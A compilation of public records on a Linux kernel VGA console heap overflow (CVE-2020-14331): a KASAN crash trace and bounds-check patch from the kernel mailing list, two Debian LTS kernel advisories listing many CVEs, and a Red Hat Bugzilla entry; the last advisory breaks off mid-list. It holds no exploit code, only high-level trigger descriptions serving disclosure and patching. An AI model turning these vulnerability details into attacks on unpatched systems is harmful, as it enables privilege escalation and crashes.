[  334.990856] RDX: 0000000000000381 RSI: 0000000020003500 RDI: 0000000000000003
[  334.990865] RBP: 00007ffe9ace0980 R08: 0000000020003530 R09: 00007ffe9ace0980
[  334.990873] R10: 0000000000000001 R11: 0000000000000246 R12: 0000000000402110
[  334.990881] R13: 0000000000000000 R14: 00000000006bf018 R15: 0000000000000000
[  334.990937]
[  334.990943] The buggy address belongs to the page:
[  334.990962] page:ffffea000f79a400 refcount:1 mapcount:0 mapping:000000002bff47b3 index:0x0 head:ffffea000f79a400 order:4 compound_mapcount:0 compound_pincount:0
[  334.990973] flags: 0x2fffff80010000(head)
[  334.990992] raw: 002fffff80010000 dead000000000100 dead000000000122 0000000000000000
[  334.991006] raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000
[  334.991013] page dumped because: kasan: bad access detected
[  334.991017]
[  334.991023] Memory state around the buggy address:
[  334.991034]  ffff8883de6a0000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991044]  ffff8883de6a0080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991054] >ffff8883de6a0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[  334.991061]                                                              ^
[  334.991071]  ffff8883de6a0180: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00
[  334.991082]  ffff8883de6a0200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  334.991088] ==================================================================

Because vgacon_scrollback_cur->tail plus memcpy size is greater than
vgacon_scrollback_cur->size. Fix this by checking the memcpy size.

Reported-by: Hulk Robot <hulkci@huawei.com>
Signed-off-by: Yang Yingliang <yangyingliang@huawei.com>
---
 [drivers/video/console/vgacon.c](#Z31drivers:video:console:vgacon.c) | 11 ++++++++---
 1 file [changed](#related), 8 insertions(+), 3 deletions(-)

[diff](#iZ31drivers:video:console:vgacon.c) --git a/drivers/video/console/vgacon.c b/drivers/video/console/vgacon.c
index 998b0de1812f..b51ffb9a208d 100644
--- a/drivers/video/console/vgacon.c
+++ b/drivers/video/console/vgacon.c
@@ -243,6 +243,7 @@ static void vgacon_scrollback_startup(void)
 static void vgacon_scrollback_update(struct vc_data *c, int t, int count)
 {
 	void *p;
+	int size;

 	if (!vgacon_scrollback_cur->data || !vgacon_scrollback_cur->size ||
 	    c->vc_num != fg_console)
@@ -251,13 +252,17 @@ static void vgacon_scrollback_update(struct vc_data *c, int t, int count)
 	p = (void *) (c->vc_origin + t * c->vc_size_row);

 	while (count--) {
+		size = vgacon_scrollback_cur->size - vgacon_scrollback_cur->tail;
+		if (size > c->vc_size_row)
+			size = c->vc_size_row;
+
 		scr_memcpyw(vgacon_scrollback_cur->data +
 			    vgacon_scrollback_cur->tail,
-			    p, c->vc_size_row);
+			    p, size);

 		vgacon_scrollback_cur->cnt++;
-		p += c->vc_size_row;
-		vgacon_scrollback_cur->tail += c->vc_size_row;
+		p += size;
+		vgacon_scrollback_cur->tail += size;

 		if (vgacon_scrollback_cur->tail >= vgacon_scrollback_cur->size)
 			vgacon_scrollback_cur->tail = 0;
--
2.17.1

```

---

```
[next](../9f47ceb6-fa01-d43e-f434-86a0b1c8df64%40huawei.com/)             [reply](#R)	other threads:[[~2020-05-13  2:05 UTC](../?t=20200513020535)|[newest](../)]

Thread overview: 3+ messages / expand[[flat](T/#u)|[nested](t/#u)]  [mbox.gz](t.mbox.gz)  [Atom feed](t.atom)  [top](#b)
     [not found] <[CGME20200513020606eucas1p148e04f5d69e5c1d6a11f8dfd1604043c@eucas1p1.samsung.com](../CGME20200513020606eucas1p148e04f5d69e5c1d6a11f8dfd1604043c%40eucas1p1.samsung.com/)>
2020-05-13  2:28 ` [Yang Yingliang [this message]](#t)
2020-06-03  2:08   ` [[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()](../9f47ceb6-fa01-d43e-f434-86a0b1c8df64%40huawei.com/) Yang Yingliang
2020-07-10 10:47   ` [Bartlomiej Zolnierkiewicz](../62544bd9-e47d-e7f9-92f2-49b8dbb132c1%40samsung.com/)

```
```
find likely ancestor, descendant, or conflicting patches for [this message](#t):
( dfblob:998b0de1812 dfblob:b51ffb9a208 )
 OR (
bs:"[PATCH -next] vgacon: Fix an out-of-bounds in vgacon_scrollback_update()" )
	([help](../_/text/help/#search))
```

---

```
Reply instructions:

You may reply publicly to [this message](#t) via plain-text email
using any one of the following methods:

* Save the following mbox file, import it into your mail client,
  and reply-to-all from there: [mbox](raw)

  Avoid top-posting and favor interleaved quoting:
  <https://en.wikipedia.org/wiki/Posting_style#Interleaved_style>

* Reply using the --to, --cc, and --in-reply-to
  switches of git-send-email(1):

  git send-email \
    --in-reply-to=1589336932-35508-1-git-send-email-yangyingliang@huawei.com \
    --to=yangyingliang@huawei.com \
    --cc=b.zolnierkie@samsung.com \
    --cc=linux-kernel@vger.kernel.org \
    /path/to/YOUR_REPLY

  <https://kernel.org/pub/software/scm/git/docs/git-send-email.html>

* If your mail client supports setting the In-Reply-To header
  via mailto: links, try the mailto: link

```
Be sure your reply has a **Subject:** header at the top and a blank line
before the message body.

---

```
This is a public inbox, see [mirroring instructions](../_/text/mirror/)
for how to clone and mirror all data and code used for this inbox;
as well as URLs for NNTP newsgroup(s).
```


=== Content from lists.debian.org_28db6a1b_20250119_120355.html ===


---

[[Date Prev](msg00031.html)][[Date Next](msg00033.html)]
[[Thread Prev](msg00031.html)][[Thread Next](msg00033.html)]
[[Date Index](maillist.html#00032)]
[[Thread Index](threads.html#00032)]

# [SECURITY] [DLA 2420-1] linux security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2420-1] linux security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Fri, 30 Oct 2020 14:21:51 +0000
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/1d83a7d37e5edd997f7572f09296464afb06fe09.camel%40debian.org)Â [1d83a7d37e5edd997f7572f09296464afb06fe09.camel@debian.org](msg00032.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-2420-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
October 29, 2020                              <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux
Version        : 4.9.240-1
CVE ID         : CVE-2019-9445 CVE-2019-19073 CVE-2019-19074 CVE-2019-19448
                 CVE-2020-12351 CVE-2020-12352 CVE-2020-12655 CVE-2020-12771
                 CVE-2020-12888 CVE-2020-14305 CVE-2020-14314 CVE-2020-14331
                 CVE-2020-14356 CVE-2020-14386 CVE-2020-14390 CVE-2020-15393
                 CVE-2020-16166 CVE-2020-24490 CVE-2020-25211 CVE-2020-25212
                 CVE-2020-25220 CVE-2020-25284 CVE-2020-25285 CVE-2020-25641
                 CVE-2020-25643 CVE-2020-26088

Several vulnerabilities have been discovered in the Linux kernel that
may lead to the execution of arbitrary code, privilege escalation,
denial of service or information leaks.

CVE-2019-9445

    A potential out-of-bounds read was discovered in the F2FS
    implementation.  A user permitted to mount and access arbitrary
    filesystems could potentially use this to cause a denial of
    service (crash) or to read sensitive information.

CVE-2019-19073, CVE-2019-19074

    Navid Emamdoost discovered potential memory leaks in the ath9k and
    ath9k_htc drivers.  The security impact of these is unclear.

CVE-2019-19448

    "Team bobfuzzer" reported a bug in Btrfs that could lead to a
    use-after-free, and could be triggered by crafted filesystem
    images.  A user permitted to mount and access arbitrary
    filesystems could use this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

CVE-2020-12351

    Andy Nguyen discovered a flaw in the Bluetooth implementation in
    the way L2CAP packets with A2MP CID are handled.  A remote attacker
    within a short distance, knowing the victim's Bluetooth device
    address, can send a malicious l2cap packet and cause a denial of
    service or possibly arbitrary code execution with kernel
    privileges.

CVE-2020-12352

    Andy Nguyen discovered a flaw in the Bluetooth implementation.
    Stack memory is not properly initialised when handling certain AMP
    packets.  A remote attacker within a short distance, knowing the
    victim's Bluetooth device address address, can retrieve kernel
    stack information.

CVE-2020-12655

    Zheng Bin reported that crafted XFS volumes could trigger a system
    hang.  An attacker able to mount such a volume could use this to
    cause a denial of service.

CVE-2020-12771

    Zhiqiang Liu reported a bug in the bcache block driver that could
    lead to a system hang.  The security impact of this is unclear.

CVE-2020-12888

    It was discovered that the PCIe Virtual Function I/O (vfio-pci)
    driver allowed users to disable a device's memory space while it
    was still mapped into a process.  On some hardware platforms,
    local users or guest virtual machines permitted to access PCIe
    Virtual Functions could use this to cause a denial of service
    (hardware error and crash).

CVE-2020-14305

    Vasily Averin of Virtuozzo discovered a potential heap buffer
    overflow in the netfilter nf_contrack_h323 module.  When this
    module is used to perform connection tracking for TCP/IPv6, a
    remote attacker could use this to cause a denial of service (crash
    or memory corruption) or possibly for remote code execution with
    kernel privilege.

CVE-2020-14314

    A bug was discovered in the ext4 filesystem that could lead to an
    out-of-bound read.  A local user permitted to mount and access
    arbitrary filesystem images could use this to cause a denial of
    service (crash).

CVE-2020-14331

    A bug was discovered in the VGA console driver's soft-scrollback
    feature that could lead to a heap buffer overflow.  On a system
    with a custom kernel that has CONFIG_VGACON_SOFT_SCROLLBACK
    enabled, a local user with access to a console could use this to
    cause a denial of service (crash or memory corruption) or possibly
    for privilege escalation.

CVE-2020-14356, CVE-2020-25220

    A bug was discovered in the cgroup subsystem's handling of socket
    references to cgroups.  In some cgroup configurations, this could
    lead to a use-after-free.  A local user might be able to use this
    to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

    The original fix for this bug introudced a new security issue,
    which is also addressed in this update.

CVE-2020-14386

    Or Cohen discovered a bug in the packet socket (AF_PACKET)
    implementation which could lead to a heap buffer overflow.  A
    local user with the CAP_NET_RAW capability (in any user namespace)
    could use this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2020-14390

    Minh Yuan discovered a bug in the framebuffer console driver's
    scrollback feature that could lead to a heap buffer overflow.  On
    a system using framebuffer consoles, a local user with access to a
    console could use this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

    The scrollback feature has been disabled for now, as no other fix
    was available for this issue.

CVE-2020-15393

    Kyungtae Kim reported a memory leak in the usbtest driver.  The
    security impact of this is unclear.

CVE-2020-16166

    Amit Klein reported that the random number generator used by the
    network stack might not be re-seeded for long periods of time,
    making e.g. client port number allocations more predictable.  This
    made it easier for remote attackers to carry out some network-
    based attacks such as DNS cache poisoning or device tracking.

CVE-2020-24490

    Andy Nguyen discovered a flaw in the Bluetooth implementation that
    can lead to a heap buffer overflow.  On systems with a Bluetooth 5
    hardware interface, a remote attacker within a short distance can
    use this to cause a denial of service (crash or memory corruption)
    or possibly for remote code execution with kernel privilege.

CVE-2020-25211

    A flaw was discovered in netfilter subsystem.  A local attacker
    able to inject conntrack Netlink configuration can cause a denial
    of service.

CVE-2020-25212

    A bug was discovered in the NFSv4 client implementation that could
    lead to a heap buffer overflow.  A malicious NFS server could use
    this to cause a denial of service (crash or memory corruption) or
    possibly to execute arbitrary code on the client.

CVE-2020-25284

    It was discovered that the Rados block device (rbd) driver allowed
    tasks running as uid 0 to add and remove rbd devices, even if they
    dropped capabilities.  On a system with the rbd driver loaded,
    this might allow privilege escalation from a container with a task
    running as root.

CVE-2020-25285

    A race condition was discovered in the hugetlb filesystem's sysctl
    handlers, that could lead to stack corruption.  A local user
    permitted to write to hugepages sysctls could use this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.  By default only the root user can do this.

CVE-2020-25641

    The syzbot tool found a bug in the block layer that could lead to
    an infinite loop.  A local user with access to a raw block device
    could use this to cause a denial of service (unbounded CPU use and
    possible system hang).

CVE-2020-25643

    ChenNan Of Chaitin Security Research Lab discovered a flaw in the
    hdlc_ppp module.  Improper input validation in the ppp_cp_parse_cr()
    function may lead to memory corruption and information disclosure.

CVE-2020-26088

    It was discovered that the NFC (Near Field Communication) socket
    implementation allowed any user to create raw sockets.  On a
    system with an NFC interface, this allowed local users to evade
    local network security policy.

For Debian 9 stretch, these problems have been fixed in version
4.9.240-1.  This update additionally includes many more bug fixes from
stable updates 4.9.229-4.9.240 inclusive.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

--
Ben Hutchings - Debian developer, member of kernel, installer and LTS teams

```

**Attachment:
[signature.asc](pgphaeY6VvqA6.pgp)**

*Description:* This is a digitally signed message part

---



=== Content from bugzilla.redhat.com_e45f5fbb_20250119_120355.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1858679)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1858679)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1858679)+ Login using a Red Hat Bugzilla account
  + ForgotÂ Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla â€“ BugÂ 1858679

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**BugÂ 1858679**](show_bug.cgi?id=1858679)
(CVE-2020-14331)
- [CVE-2020-14331](https://access.redhat.com/security/cve/CVE-2020-14331) kernel: kernel: buffer over write in vgacon\_scroll

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2020-14331 kernel: kernel: buffer over write in vgacon\_scroll

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2020-14331 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1859467](show_bug.cgi?id=1859467) [1859468](show_bug.cgi?id=1859468) [1859469](show_bug.cgi?id=1859469) [1859470](show_bug.cgi?id=1859470) [1859471](show_bug.cgi?id=1859471) [1859472](show_bug.cgi?id=1859472) [1859473](show_bug.cgi?id=1859473) [1859474](show_bug.cgi?id=1859474) [1859475](show_bug.cgi?id=1859475) [1861348](show_bug.cgi?id=1861348 "CLOSED ERRATA - CVE-2020-14331 kernel: kernel: buffer over write in vgacon_scroll [fedora-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1856727](show_bug.cgi?id=1856727) | | TreeView+ | [depends on](buglist.cgi?bug_id=1858679&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1858679&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2020-07-20 05:18 UTC by Dhananjay Arunesh | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 21:17 UTC ([History](show_activity.cgi?id=1858679)) | | [CC List:](page.cgi?id=fields.html#cclist) | 48 users (show)  acaringi airlied bhu blc bmasney brdeoliv bskeggs dhoward dvlasenk esammons fhrbata hdegoede hkrzesin iboverma ichavero itamar jarodwilson jeremy jforbes jglisse jlelli john.j5live jonathan josef jross jshortt jstancek jwboyer kcarcia kernel-maint kernel-mgr lgoncalv linville masami256 matt mchehab mcressma mjg59 mlangsdo nmurray pmatouse ptalbert qzhao rt-maint rvrbovsk security-response-team steved williams | | Fixed In Version: |  | | | Doc Type: | If docs needed, set a value | | | Doc Text: | A flaw was found in the Linux kernelâ€™s implementation of the invert video code on VGA consoles when a local attacker attempts to resize the console, calling an ioctl VT\_RESIZE, which causes an out-of-bounds write to occur. This flaw allows a local user with access to the VGA console to crash the system, potentially escalating their privileges on the system. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2020-10-20 14:21:13 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2020:4286](https://access.redhat.com/errata/RHSA-2020%3A4286) | 0 | None | None | None | 2020-10-20 08:47:44 UTC | | Red Hat Product Errata | [RHSA-2020:4289](https://access.redhat.com/errata/RHSA-2020%3A4289) | 0 | None | None | None | 2020-10-20 08:59:48 UTC | | Red Hat Product Errata | [RHSA-2020:5023](https://access.redhat.com/errata/RHSA-2020%3A5023) | 0 | None | None | None | 2020-11-10 13:06:08 UTC | | Red Hat Product Errata | [RHSA-2020:5026](https://access.redhat.com/errata/RHSA-2020%3A5026) | 0 | None | None | None | 2020-11-10 13:07:23 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1858679#c0)  Dhananjay Arunesh    2020-07-20 05:18:11 UTC  ``` A flaw was found in the Linux kernelâ€™s implementation of the invert video code on VGA consoles when a local attacker attempts to resize the console both calling ioctl VT_RESIZE. An out-of-bounds write can occur. A local user with access to the VGA console could use this flaw to crash the system, potentially escalating their privileges on the system.   ```  [Comment 3](show_bug.cgi?id=1858679#c3)  Alex    2020-07-22 08:15:44 UTC  ``` Mitigation:  Mitigation for this issue is either not available or the currently available options don't meet the Red Hat Product Security criteria comprising ease of use and deployment, applicability to widespread installation base or stability.   ```  [Comment 4](show_bug.cgi?id=1858679#c4)  Alex    2020-07-22 08:18:25 UTC  ``` Statement:  This flaw is rated as a having Moderate impact, because only local user with access to VGA console can trigger it (for example if booting with param "nomodeset").   ```  [Comment 5](show_bug.cgi?id=1858679#c5)  Petr Matousek    2020-07-22 08:39:02 UTC  ``` Acknowledgments:  Name: Yunhai Zhang (NSFOCUS Security Team)   ```  [Comment 10](show_bug.cgi?id=1858679#c10)  msiddiqu    2020-07-28 11:15:23 UTC  ``` Created kernel tracking bugs for this issue:  Affects: fedora-all [[bug 1861348](show_bug.cgi?id=1861348 "CLOSED ERRATA - CVE-2020-14331 kernel: kernel: buffer over write in vgacon_scroll [fedora-all]")]   ```  [Comment 11](show_bug.cgi?id=1858679#c11)  msiddiqu    2020-07-29 13:31:22 UTC  ``` References:  <https://www.openwall.com/lists/oss-security/2020/07/28/2> <https://lists.openwall.net/linux-kernel/2020/07/29/234>   ```  [Comment 12](show_bug.cgi?id=1858679#c12)  Justin M. Forbes    2020-10-08 19:14:24 UTC  ``` This was fixed for Fedora with the 5.7.15 stable kernel updates.   ```  [Comment 19](show_bug.cgi?id=1858679#c19)  errata-xmlrpc    2020-10-20 08:47:35 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2020:4286 [https://access.redhat.com/errata/RHSA-2020:4286](https://access.redhat.com/errata/RHSA-2020%3A4286)   ```  [Comment 20](show_bug.cgi?id=1858679#c20)  errata-xmlrpc    2020-10-20 08:59:42 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2020:4289 [https://access.redhat.com/errata/RHSA-2020:4289](https://access.redhat.com/errata/RHSA-2020%3A4289)   ```  [Comment 21](show_bug.cgi?id=1858679#c21)  Product Security DevOps Team    2020-10-20 14:21:13 UTC  ``` This bug is now closed. Further updates for individual products will be reflected on the CVE page(s):  <https://access.redhat.com/security/cve/cve-2020-14331>   ```  [Comment 25](show_bug.cgi?id=1858679#c25)  errata-xmlrpc    2020-11-10 13:06:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2020:5023 [https://access.redhat.com/errata/RHSA-2020:5023](https://access.redhat.com/errata/RHSA-2020%3A5023)   ```  [Comment 26](show_bug.cgi?id=1858679#c26)  errata-xmlrpc    2020-11-10 13:07:19 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2020:5026 [https://access.redhat.com/errata/RHSA-2020:5026](https://access.redhat.com/errata/RHSA-2020%3A5026)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1858679&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from lists.debian.org_42121a34_20250119_120355.html ===


---

[[Date Prev](msg00033.html)][[Date Next](msg00035.html)]
[[Thread Prev](msg00033.html)][[Thread Next](msg00035.html)]
[[Date Index](maillist.html#00034)]
[[Thread Index](threads.html#00034)]

# [SECURITY] [DLA 2420-2] linux regression update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2420-2] linux regression update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Sat, 31 Oct 2020 16:13:58 +0000
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/09a2a6e42f941faa3fa3f8b530d5e04cd962305e.camel%40debian.org)Â [09a2a6e42f941faa3fa3f8b530d5e04cd962305e.camel@debian.org](msg00034.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-2420-2                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
October 31, 2020                              <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux
Version        : 4.9.240-2
CVE ID         : CVE-2019-9445 CVE-2019-19073 CVE-2019-19074 CVE-2019-19448
                 CVE-2020-12351 CVE-2020-12352 CVE-2020-12655 CVE-2020-12771
                 CVE-2020-12888 CVE-2020-14305 CVE-2020-14314 CVE-2020-14331
                 CVE-2020-14356 CVE-2020-14386 CVE-2020-14390 CVE-2020-15393
                 CVE-2020-16166 CVE-2020-24490 CVE-2020-25211 CVE-2020-25212
                 CVE-2020-25220 CVE-2020-25284 CVE-2020-25285 CVE-2020-25641
                 CVE-2020-25643 CVE-2020-26088

This update corrects a regression in some Xen virtual machine
environments.  For reference the original advisory text follows.

Several vulnerabilities have been discovered in the Linux kernel that
may lead to the execution of arbitrary code, privilege escalation,
denial of service or information leaks.

CVE-2019-9445

    A potential out-of-bounds read was discovered in the F2FS
    implementation.  A user permitted to mount and access arbitrary
    filesystems could potentially use this to cause a denial of
    service (crash) or to read sensitive information.

CVE-2019-19073, CVE-2019-19074

    Navid Emamdoost discovered potential memory leaks in the ath9k and
    ath9k_htc drivers.  The security impact of these is unclear.

CVE-2019-19448

    "Team bobfuzzer" reported a bug in Btrfs that could lead to a
    use-after-free, and could be triggered by crafted filesystem
    images.  A user permitted to mount and access arbitrary
    filesystems could use this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

CVE-2020-12351

    Andy Nguyen discovered a flaw in the Bluetooth implementation in
    the way L2CAP packets with A2MP CID are handled.  A remote attacker
    within a short distance, knowing the victim's Bluetooth device
    address, can send a malicious l2cap packet and cause a denial of
    service or possibly arbitrary code execution with kernel
    privileges.

CVE-2020-12352

    Andy Nguyen discovered a flaw in the Bluetooth implementation.
    Stack memory is not properly initialised when handling certain AMP
    packets.  A remote attacker within a short distance, knowing the
    victim's Bluetooth device address address, can retrieve kernel
    stack information.

CVE-2020-12655

    Zheng Bin reported that crafted XFS volumes could trigger a system
    hang.  An attacker able to mount such a volume could use this to
    cause a denial of service.

CVE-2020-12771

    Zhiqiang Liu reported a bug in the bcache block driver that could
    lead to a system hang.  The security impact of this is unclear.

CVE-2020-12888

    It was discovered that the PCIe Virtual Function I/O (vfio-pci)
    driver allowed users to disable a device's memory space while it
    was still mapped into a process.  On some hardware platforms,
    local users or guest virtual machines permitted to access PCIe
    Virtual Functions could use this to cause a denial of service
    (hardware error and crash).

CVE-2020-14305

    Vasily Averin of Virtuozzo discovered a potential heap buffer
    overflow in the netfilter nf_contrack_h323 module.  When this
    module is used to perform connection tracking for TCP/IPv6, a
    remote attacker could use this to cause a denial of service (crash
    or memory corruption) or possibly for remote code execution with
    kernel privilege.

CVE-2020-14314

    A bug was discovered in the ext4 filesystem that could lead to an
    out-of-bound read.  A local user permitted to mount and access
    arbitrary filesystem images could use this to cause a denial of
    service (crash).

CVE-2020-14331

    A bug was discovered in the VGA console driver's soft-scrollback
    feature that could lead to a heap buffer overflow.  On a system
    with a custom kernel that has CONFIG_VGACON_SOFT_SCROLLBACK
    enabled, a local user with access to a console could use this to
    cause a denial of service (crash or memory corruption) or possibly
    for privilege escalation.

CVE-2020-14356, CVE-2020-25220

    A bug was discovered in the cgroup subsystem's handling of socket
    references to cgroups.  In some cgroup configurations, this could
    lead to a use-after-free.  A local user might be able to use this
    to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

    The original fix for this bug introudced a new security issue,
    which is also addressed in this update.

CVE-2020-14386

    Or Cohen discovered a bug in the packet socket (AF_PACKET)
    implementation which could lead to a heap buffer overflow.  A
    local user with the CAP_NET_RAW capability (in any user namespace)
    could use this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2020-14390

    Minh Yuan discovered a bug in the framebuffer console driver's
    scrollback feature that could lead to a heap buffer overflow.  On
    a system using framebuffer consoles, a local user with access to a
    console could use this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

    The scrollback feature has been disabled for now, as no other fix
    was available for this issue.

CVE-2020-15393

    Kyungtae Kim reported a memory leak in the usbtest driver.  The
    security impact of this is unclear.

CVE-2020-16166

    Amit Klein reported that the random number generator used by the
    network stack might not be re-seeded for long periods of time,
    making e.g. client port number allocations more predictable.  This
    made it easier for remote attackers to carry out some network-
    based attacks such as DNS cache poisoning or device tracking.

CVE-2020-24490

    Andy Nguyen discovered a flaw in the Bluetooth implementation that
    can lead to a heap buffer overflow.  On systems with a Bluetooth 5
    hardware interface, a remote attacker within a short distance can
